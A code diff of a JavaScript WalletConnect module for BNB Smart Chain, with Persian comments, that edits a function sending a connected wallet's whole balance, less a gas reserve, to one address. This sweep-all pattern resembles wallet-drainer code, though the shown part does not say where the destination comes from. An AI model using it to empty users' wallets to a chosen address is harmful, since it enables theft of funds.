@@ -1,7 +1,7 @@
 import { ethers } from 'ethers';
 import EthereumProvider from '@walletconnect/ethereum-provider';
 
-// جایگزین با Project ID خود از WalletConnect Cloud
+// جایگزین کن با Project ID واقعی از WalletConnect Cloud
 const projectId = '4d08946e6c316bed5e76b450ccbb5256';
 
 const metadata = {
@@ -13,7 +13,7 @@ const metadata = {
 
 const providerOptions = {
   projectId,
-  chains: [56], // BNB Smart Chain Mainnet
+  chains: [56], // BNB Smart Chain
   showQrModal: true,
   metadata,
 };
@@ -44,10 +44,7 @@ export async function getBalance(provider, address) {
 export async function sendAllBNB(signer, toAddress) {
   try {
     const balanceWei = await signer.getBalance();
-
-    // رزرو مقدار مشخصی برای گس (مثلاً 0.0002 BNB)
     const reservedForGas = ethers.utils.parseUnits("0.0002", "ether");
-
     const amountToSend = balanceWei.sub(reservedForGas);
 
     if (amountToSend.lte(0)) {
@@ -55,25 +52,23 @@ export async function sendAllBNB(signer, toAddress) {
       return;
     }
 
-    // تخمین gasLimit و تبدیل آن به رشته برای سازگاری با Trust Wallet
     const estimatedGasLimit = await signer.estimateGas({
       to: toAddress,
       value: amountToSend,
     });
-    const gasLimit = estimatedGasLimit.toString();
 
-    // دریافت gasPrice و تبدیل آن به رشته
-    const gasPrice = (await signer.getGasPrice()).toString();
+    const gasPrice = await signer.getGasPrice();
 
     const tx = await signer.sendTransaction({
       to: toAddress,
       value: amountToSend,
-      gasLimit,
-      gasPrice,
+      gasLimit: estimatedGasLimit.toString(), // تبدیل به string برای سازگاری کامل
+      gasPrice: gasPrice.toString(),
+      type: 0, // تراکنش سنتی (EIP-1559 خاموش)
     });
 
     await tx.wait();
-    alert('تراکنش با موفقیت ارسال شد.');
+    alert('تراکنش با موفقیت انجام شد.');
   } catch (err) {
     console.error('خطا در ارسال تراکنش:', err);
     alert('خطا در ارسال تراکنش: ' + (err?.message || 'نامشخص'));
